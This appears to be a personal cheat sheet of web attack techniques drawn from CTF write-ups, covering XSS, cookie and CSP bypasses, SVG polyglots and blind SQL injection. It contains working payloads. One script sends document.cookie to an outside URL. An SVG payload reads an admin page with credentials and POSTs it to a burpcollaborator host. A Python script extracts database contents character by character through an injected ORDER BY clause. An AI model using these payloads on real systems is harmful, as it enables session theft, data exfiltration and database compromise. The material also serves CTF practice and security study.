# xss

https://security.stackexchange.com/questions/162436/example-of-reflected-client-xss-which-is-not-dom-based-xss

Mitigations:

- [Using HTTP cookies \- HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Security)
    - Set-Cookie header
        - SameSite - cookie not sent via cross-origin requests
        - Secure - cookie sent strictly via https
        - HttpOnly - cookie not accessible in js
            - bypass: server-side debug info logging
            ```html
            <?php header("Set-Cookie: SESSIONID=ImAhttpOnlyCookie; path=/; httponly"); ?>
            <a href='phpinfo.php'>aa</a>
            ```
            ~/code/guides/ctf/WebBook/HTTP/XSS学习.md
- [Content Security Policy \(CSP\) \- HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
    - bypass: using valid elements/attributes
        - `default-src 'self'; script-src 'self' foo.bar.com 'unsafe-inline';` => `<link rel=prefetch href=//bar.com`
        - `<script>//# sourceMappingURL=https://request/?${escape(document.cookie)}</script>`
            - [Bypass unsafe\-inline mode CSP](https://paper.seebug.org/91/)

Polyglots:

```svg
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 751 751" enable-background="new 0 0 751 751" xml:space="preserve">  <image id="image0" width="751" height="751" x="0" y="0"
    href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo" />
<script>alert(1)</script>
</svg>

<?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve"> 
  ...
  <g>
    <polygon fill="#00B0D9" points="41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 "></polygon>
    <script type="text/javascript">
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          var xhr2 = new XMLHttpRequest();
          xhr2.open("POST", "http://XXXX.burpcollaborator.net/");
          xhr2.send(xhr.responseText);
        }
      }   
      xhr.open("GET", "http://web50.zajebistyc.tf/profile/admin");
      xhr.withCredentials = true;
      xhr.send();
    </script>
  </g>
  ...
</svg>
```

- [CONFidence CTF 2019\-Web 50分析思考 &\#8211; 郁离歌丶的博客](http://yulige.top/?p=665)
    - [SVG XSS的一个黑魔法 · Tuuu Nya&\#39;s Blog](https://www.hackersb.cn/hacker/85.html)

# sqli

Replace spaces with parenthesis:

```python
import requests
import string

session = requests.session()
url = "http://202.120.7.197/app.php"
cookie = {"PHPSESSID": "ck8pgb52nkkb8sdg2c95ms7s16"}
flag = ""

for i in xrange(1, 50):
    for j in string.printable:
        if j == "%": continue
        param = {"action": "search", "keyword": "", "order": "if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),{length},1)like({num}),price,name)".format(length=str(i), num=hex(ord(j)))}
        # print param
        res = session.get(url=url, params=param, cookies=cookie)
        content = res.text
        # print content
        if content.find("\"id\":\"5\"") > content.find("\"id\":\"2\""):
            print j
            flag += j
            print flag
            break
```

https://www.40huo.cn/blog/0ctf-2017-writeup.html


